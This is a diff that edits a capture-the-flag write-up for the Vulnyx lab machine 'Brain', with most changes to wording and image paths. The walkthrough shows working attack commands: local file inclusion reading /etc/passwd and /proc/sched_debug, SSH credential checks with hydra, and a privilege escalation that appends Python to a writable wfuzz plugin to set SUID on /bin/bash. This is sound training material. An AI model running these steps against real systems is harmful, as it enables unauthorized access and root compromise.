@@ -5,7 +5,7 @@
 | **Platform** | Vulnyx |
 | **OS** | Linux |
 | **Difficulty** | Easy |
-| **Creator** | d4t4s3c |
+| **Creator** | `d4t4s3c` |
 | **Tools used** | `nmap` · `gobuster` · `ffuf` · `curl` · `hydra` · `wfuzz` |
 | **Tags** | `#LFI` `#ProcFS` `#CredentialLeak` `#SudoAbuse` `#SUID` `#PrivEsc` |
 | **URL** | https://vulnyx.com/machines/ |
@@ -14,9 +14,9 @@ The main page hints at a Local File Inclusion vulnerability by rendering content
 
 ## Enumeration
 
-### Port Scanning
+### Port Enumeration
 
-A full TCP port scan is run first:
+A full TCP port scan comes first:
 
 ```bash
 $ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn brain.nyx
@@ -24,10 +24,10 @@ $ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn brain.nyx
 PORT   STATE SERVICE REASON
 22/tcp open  ssh     syn-ack ttl 64
 80/tcp open  http    syn-ack ttl 64
-MAC Address: 08:00:27:D0:8F:8E (Oracle VirtualBox virtual NIC)
+MAC Address: 08:00:27:43:C4:B4 (Oracle VirtualBox virtual NIC)
 ```
 
-Two ports are found open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details:
+Two ports come back open: **22 (SSH)** and **80 (HTTP)**. A version and script scan on both fills in the details:
 
 ```bash
 $ sudo nmap -p 22,80 -sCV brain.nyx
@@ -57,9 +57,9 @@ http://brain.nyx
 
 The content rendered on the front page looks suspiciously like the output of `/proc/sched_debug` — the kernel's task scheduler dump. That's an odd thing to display on a landing page, and it's the first hint that the app is including a local file into the page rather than serving static content:
 
-<img src="../Images\brain\Pasted image 20260517181111.png" alt="brain.nyx main page, showing content resembling /proc/sched_debug output"/>
+<img src="../Images/brain/Pasted image 20260517181111.png" alt="brain.nyx main page, showing content resembling /proc/sched_debug output"/>
 
-A directory scan is run to look for pages not linked from the front page:
+A directory scan looks for pages not linked from the front page:
 
 ```bash
 $ gobuster dir -u 'http://brain.nyx/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
@@ -77,7 +77,7 @@ Finished
 
 ### Local File Inclusion
 
-`index.php` looks like it's pulling in content dynamically, which raises the question of whether one of its parameters can be pointed at an arbitrary file. `ffuf` is used to fuzz for a parameter name that changes the response when set to a known file path:
+`index.php` looks like it's pulling in content dynamically, which raises the question of whether one of its parameters can be pointed at an arbitrary file. `ffuf` fuzzes for a parameter name that changes the response when set to a known file path:
 
 ```bash
 $ ffuf -u 'http://brain.nyx/index.php?FUZZ=/etc/passwd' -w /usr/share/wordlists/dirb/common.txt -fs 361
@@ -86,13 +86,15 @@ include               [Status: 200, Size: 1750, Words: 125, Lines: 34, Duration:
 :: Progress: [4614/4614] :: Job [1/1] :: 292 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
 ```
 
-The `-fs 361` flag filters out the baseline response size, so only parameter names that actually change the page's output survive in the results — a match here means that parameter name is being used somewhere to include a file. The finding is confirmed directly:
+The `-fs 361` flag filters out the baseline response size, so only parameter names that actually change the page's output survive in the results — a match here means that parameter name is being used somewhere to include a file. A quick check confirms the finding:
 
 ```
 view-source:http://brain.nyx/?include=/etc/passwd
 ```
 
-The response includes the contents of `/etc/passwd`, confirming arbitrary local file read, and enumerating valid shell users on the box:
+<img src="../Images/brain/Pasted image 20260517181210.png" alt="/etc/passwd contents rendered through the vulnerable include parameter"/>
+
+The response includes the contents of `/etc/passwd`, confirming arbitrary local file read and enumerating valid shell users on the box:
 
 ```bash
 $ curl -sX GET "http://brain.nyx/index.php?include=/etc/passwd" | grep "sh$"
@@ -100,8 +102,6 @@ $ curl -sX GET "http://brain.nyx/index.php?include=/etc/passwd" | grep "sh$"
 root:x:0:0:root:/root:/bin/bash
 ben:x:1000:1000:ben,,,:/home/ben:/bin/bash
 ```
-
-<img src="../Images\brain\Pasted image 20260517181210.png" alt="/etc/passwd contents rendered through the vulnerable include parameter"/>
 
 Two users with a real shell turn up: `root` and `ben`. Following up on the earlier hint from the front page — whose content already resembled a `sched_debug` dump — the `include` parameter is pointed at `/proc/sched_debug` directly, and the output is filtered for the username just enumerated, `ben`:
 
@@ -116,7 +116,9 @@ The field that leaks here isn't a command line — `/proc/sched_debug` doesn't e
 
 ## Initial Access
 
-The credentials are validated against SSH with `hydra`:
+### Shell as ben
+
+`hydra` validates the credentials against SSH:
 
 ```bash
 $ hydra -l 'ben' -p 'B3nP4zz' ssh://brain.nyx
@@ -134,7 +136,6 @@ They check out, and a connection follows:
 ```bash
 $ ssh ben@brain.nyx
 ben@brain.nyx's password:
-Linux brain 4.19.0-23-amd64 #1 SMP Debian 4.19.269-1 (2022-12-20) x86_64
 ben@brain:~$ id
 uid=1000(ben) gid=1000(ben) groups=1000(ben)
 ben@brain:~$ ls -l /home/ben
@@ -165,13 +166,13 @@ ben@brain:~$ ls -l /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/range.p
 
 `ben` can run `wfuzz` as root via `sudo`, and one of `wfuzz`'s own Python payload plugins, `range.py`, turns out to be writable. Since `wfuzz` imports and executes that plugin's code as part of generating its fuzz payloads, anything appended to the file runs in whatever context `wfuzz` itself is running under — root, in this case, once invoked through `sudo`.
 
-Malicious Python is appended to the plugin, setting the SUID bit on `/bin/bash`:
+Appending malicious Python to the plugin sets the SUID bit on `/bin/bash`:
 
 ```bash
 ben@brain:~$ echo -e 'import os\nos.system("chmod 4755 /bin/bash")' >> /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/range.py
 ```
 
-`wfuzz` is then run as root using that same payload type, which loads and executes the modified plugin:
+Running `wfuzz` as root with that same payload type loads and executes the modified plugin:
 
 ```bash
 ben@brain:~$ sudo -u root /usr/bin/wfuzz -c -z range,1-65535 -u http://127.0.0.1/FUZZ
@@ -184,7 +185,7 @@ ben@brain:~$ ls -l /bin/bash
 -rwsr-xr-x 1 root root ... /bin/bash
 ```
 
-A SUID `bash` retains the privileges of its owner (root) when invoked with `-p`, which skips bash's usual privilege-dropping behavior for SUID binaries.
+A SUID `bash` retains the privileges of its owner (root) when invoked with `-p`, which skips bash's usual privilege-dropping behavior for SUID binaries:
 
 ```bash
 ben@brain:~$ /bin/bash -p
